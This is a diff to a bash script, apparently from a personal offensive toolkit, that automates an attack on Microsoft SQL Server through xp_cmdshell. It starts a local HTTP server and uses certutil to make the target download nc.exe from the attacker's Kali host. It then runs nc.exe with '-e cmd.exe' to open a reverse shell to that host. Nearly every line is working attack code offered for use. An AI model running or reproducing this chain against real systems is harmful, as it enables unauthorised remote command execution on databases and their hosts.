@@ -4,33 +4,31 @@
 execute xp_cmdshell nc reverse shell
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
+source "${SCRIPTS_DIR}/sqlDatabase/mssql/.files/execute_xp_cmdshell.sh"
 
-# Generate gui form
-generate_form "HTTP PORT" "SHELL PORT"
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+HTTP_PORT_FIELD=$(form_item "HTTP PORT" "http_port")
+SHELL_PORT_FIELD=$(form_item "SHELL PORT" "shell_port")
 
-HTTP_PORT=${form_data["HTTP PORT"]}
-SHELL_PORT=${form_data["SHELL PORT"]}
+# Generate GUI form
+generate_form "${HTTP_PORT_FIELD}" "${SHELL_PORT_FIELD}"
 
-cd ~/Desktop/base/code/xdotool/scripts/fileTransfer/windows/.binaries
+HTTP_PORT=${form_data["http_port"]}
+SHELL_PORT=${form_data["shell_port"]}
+
+cd ${SCRIPTS_DIR}/fileTransfer/windows/.binaries
 python3 -m http.server ${HTTP_PORT} &
 HTTP_PID=$!
 
-
 TMP_FOLDER="C:\temp"
 
-paste_command "EXEC xp_cmdshell 'if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}'"
-xdotool key Return
+execute_xp_cmdshell "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
 sleep 0.8
 
-paste_command "EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://${KALI_IP}:${HTTP_PORT}/nc.exe ${TMP_FOLDER}\nc.exe'"
-xdotool key Return
+execute_xp_cmdshell "certutil.exe -urlcache -split -f http://${KALI_IP}:${HTTP_PORT}/nc.exe ${TMP_FOLDER}\nc.exe"
 sleep 3
 
-paste_command "EXEC xp_cmdshell '${TMP_FOLDER}\nc.exe ${KALI_IP} ${SHELL_PORT} -e cmd.exe'"
-xdotool key Return
+execute_xp_cmdshell "${TMP_FOLDER}\nc.exe ${KALI_IP} ${SHELL_PORT} -e cmd.exe"
 sleep 10
 
 kill $HTTP_PID
